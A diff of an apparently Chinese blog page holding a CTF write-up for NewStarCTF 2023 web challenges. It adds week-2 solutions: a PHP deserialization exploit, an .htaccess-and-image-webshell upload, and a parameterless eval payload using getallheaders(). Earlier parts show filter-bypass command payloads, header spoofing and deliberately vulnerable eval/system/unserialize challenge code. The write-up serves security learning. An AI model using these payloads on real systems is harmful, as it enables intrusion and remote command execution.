@@ -501,21 +501,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-10-06
+                    2023-10-23
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    459
+                    658
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    2 分
+                    3 分
                 </div>
                 
 
@@ -540,8 +540,8 @@
             <div id="articleContent">
                 <meta name="referrer" content="no-referrer"/>
 
-<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h4 id="泄漏的秘密"><a href="#泄漏的秘密" class="headerlink" title="泄漏的秘密"></a>泄漏的秘密</h4><p><strong>robots.txt+<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a></strong> 得到flag。</p>
-<h4 id="Begin-of-Upload"><a href="#Begin-of-Upload" class="headerlink" title="Begin of Upload"></a>Begin of Upload</h4><p><img src="https://img-blog.csdnimg.cn/0438e24d7ed54a9d8c4375b2347ea9a6.png" alt="1"><br>蚁剑连接之后找到flag。<br><img src="https://img-blog.csdnimg.cn/5a0f93ee0a904b79b076100d8c03dfe9.png" alt="5"></p>
+<h2 id="week1-web"><a href="#week1-web" class="headerlink" title="week1-web"></a>week1-web</h2><h3 id="泄漏的秘密"><a href="#泄漏的秘密" class="headerlink" title="泄漏的秘密"></a>泄漏的秘密</h3><p><strong>robots.txt+<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a></strong> 得到flag。</p>
+<h3 id="Begin-of-Upload"><a href="#Begin-of-Upload" class="headerlink" title="Begin of Upload"></a>Begin of Upload</h3><p><img src="https://img-blog.csdnimg.cn/0438e24d7ed54a9d8c4375b2347ea9a6.png" alt="1"><br>蚁剑连接之后找到flag。<br><img src="https://img-blog.csdnimg.cn/5a0f93ee0a904b79b076100d8c03dfe9.png" alt="5"></p>
 <h3 id="Begin-of-HTTP"><a href="#Begin-of-HTTP" class="headerlink" title="Begin of HTTP"></a>Begin of HTTP</h3><p>先GET传入ctf&#x3D;1，在传入secret&#x3D;1，发现需要传入特定值<br><img src="https://img-blog.csdnimg.cn/c50cefbdd8e64ff3b2152524b7413d18.png" alt="1"><br>查看源码找到secret的值<strong>n3wst4rCTF2023g00000d</strong><br><img src="https://img-blog.csdnimg.cn/7f5108c2a098479c9fb5b88b15f62d94.png" alt="5"><br>更改cookie中的power的值，改为<strong>ctfer</strong>。<br>更改UA头为<strong>NewStarCTF2023</strong>。<br>添加Referer为<strong>newstarctf.com</strong>。<br>添加X-Real-Ip为<strong>127.0.0.1</strong>。<br>拿到flag<br><img src="https://img-blog.csdnimg.cn/2c6c547e81d44b5eb3fb30ccff29ed98.png" alt="123"></p>
 <h3 id="ErrorFlask"><a href="#ErrorFlask" class="headerlink" title="ErrorFlask"></a>ErrorFlask</h3><p>让其报错即可拿到flag。<br><img src="https://img-blog.csdnimg.cn/51afcb55d57645e291489cc2d73b1685.png" alt="456"></p>
 <h3 id="Begin-of-PHP"><a href="#Begin-of-PHP" class="headerlink" title="Begin of PHP"></a>Begin of PHP</h3><p>简单审计一下代码</p>
@@ -626,6 +626,49 @@
 <p>**password&#x3D;114514&amp;e[v.a.l&#x3D;echo <code>more /fl??</code>;**<br><img src="https://img-blog.csdnimg.cn/9c50573ea17242a8a5b0d8ec5c77f872.png" alt="1"></p>
 </blockquote>
 <h3 id="EasyLogin"><a href="#EasyLogin" class="headerlink" title="EasyLogin"></a>EasyLogin</h3><p>打开就是一个登录框<br>尝试admin弱密码000000成功登录通过查看burp的记录发现302跳转，存在flag。<br><img src="https://img-blog.csdnimg.cn/b2b750f96f9645d28a39e9f346dfd175.png" alt="2"></p>
+<h2 id="week2-web"><a href="#week2-web" class="headerlink" title="week2-web"></a>week2-web</h2><p>挑一些重要的写吧。。。</p>
+<h3 id="Unserialize？"><a href="#Unserialize？" class="headerlink" title="Unserialize？"></a>Unserialize？</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment">// Maybe you need learn some knowledge about deserialize?</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">evil</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">private</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span><span class="token comment">//这里的cmd是私有属性</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/cat|tac|more|tail|base/i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+            @<span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+@<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'unser'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<blockquote>
+<p>private反序列化后是%00(类名)%00(变量名)，protect是%00*%00(变量名)</p>
+</blockquote>
+<p>exp</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">evil</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">evil</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$a</span><span class="token operator">-></span><span class="token property">cmd</span><span class="token operator">=</span><span class="token string double-quoted-string">"nl /th1s_1s_fffflllll4444aaaggggg"</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="Upload-again"><a href="#Upload-again" class="headerlink" title="Upload again!"></a>Upload again!</h3><p>文件上传、<code>.htaccess文件</code><br>先上传.htaccess文件<br><img src="https://img-blog.csdnimg.cn/06c6774f41e748d3937afeb063413849.png" alt="123"></p>
+<p>在上传图片马<br><img src="https://img-blog.csdnimg.cn/d6feb5d5e82246a686a979196cfb1fcf.png" alt="123"><br>即可成功命令执行</p>
+<h3 id="R-C-E-1"><a href="#R-C-E-1" class="headerlink" title="R!!C!!E!!"></a>R!!C!!E!!</h3><p>.git源码泄露<br><img src="https://img-blog.csdnimg.cn/94e16be6682f42139c3071d6964ebc59.png" alt="456"><br>查看bo0g1pop.php文件</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string single-quoted-string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[^\W]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'star'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i'</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'star'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'star'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><code>if (&#39;;&#39; === preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $_GET[&#39;star&#39;]))</code>无参数rce</p>
+<blockquote>
+<p>GET：<br>star&#x3D;eval(next(getallheaders()));<br><img src="https://img-blog.csdnimg.cn/bffdd37418c0412c80b75fb545225002.png" alt="123"></p>
+</blockquote>
 
                 
             </div>
@@ -1453,7 +1496,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">76.6k</span>&nbsp;字
+                class="white-color">77.3k</span>&nbsp;字
             
             
             
